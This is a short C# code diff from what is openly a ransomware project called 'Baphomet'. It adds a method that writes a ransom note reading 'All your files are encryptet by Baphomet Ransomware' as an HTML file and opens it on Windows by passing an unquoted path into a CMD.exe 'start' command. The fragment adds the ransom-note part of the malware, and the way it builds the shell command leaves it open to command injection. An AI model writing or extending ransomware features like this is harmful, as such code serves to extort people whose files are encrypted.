@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
@@ -55,5 +56,16 @@ namespace Baphomet.Utilities
             }
 
         }//</changeImgage>
+
+        public void OpenNote(string note_path)
+        {
+            var index = "<!DOCTYPE html><html><body><h1>UUppppsss... Ranwomare alert</h1><h4>All your files are encryptet by Baphomet Ransomware</h4></body></html>";
+            File.WriteAllText(Path.Combine(note_path,"note.html"), index);
+            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+            {
+                var strCmdText = "/K start " + note_path + "\\note.html";
+                Process.Start("CMD.exe", strCmdText).WaitForExit();
+            }
+        }
     }
 }
